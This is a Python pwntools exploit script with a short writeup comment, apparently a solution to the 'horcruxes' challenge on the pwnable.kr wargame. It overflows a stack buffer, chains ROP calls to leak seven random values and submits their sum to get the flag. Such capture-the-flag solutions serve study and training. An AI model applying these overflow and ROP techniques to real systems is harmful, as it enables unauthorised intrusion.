#!/usr/bin/env python3
from pwn import *
from ctypes import c_int32

# Writeup:
# We are able to ROP the ropme function.
#
# We would like to jump to the place that just
# opens the flag and reads it out.
#
# However, that address is at 0x080a010e.
# Notice it contains an 0a which is \n.
# We are not able to send \n's :(
#
# The functions that print out the values
# for A-G (horcruxes) are located at addresses
# that does NOT include a \n character.
# Furthermore, the main function call site
# to the ropme function is also located at an
# address that does not include \n
#
# The idea is therefore to ROP it multiple
# times to read out the random values,
# sum them up and get the flag.

context.terminal = ["tmux", "splitw", "-h"]

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./horcruxes')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    else:
        return remote('pwnable.kr', port=9032)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# tbreak main

# sum check
break *0x080a0107

# ret from ropme
# break *0x080a0176

continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x809f000)

io = start()


def find_exp(addr):
    call_rop_me = 0x0809fffc
    return_addr_offset = 120
    io.sendlineafter('Select Menu:', b'0')
    payload = b''
    while len(payload) < return_addr_offset:
        payload += b'A'
    payload += p32(addr)
    payload += p32(call_rop_me)
    assert b'\n' not in payload
    io.sendlineafter('How many EXP did you earned? : ', payload)
    io.recvuntil('(EXP +')
    exp = io.recvuntil(')\n', drop=True).decode()
    exp_int = int(exp)
    info("Got exp: %d" % exp_int)
    return exp_int

sum = 0
for x in 'ABCDEFG':
    sum += find_exp(exe.symbols[x])

io.sendlineafter('Select Menu:', b'0')
io.sendlineafter('How many EXP did you earned? : ', str(c_int32(sum).value))
io.interactive()
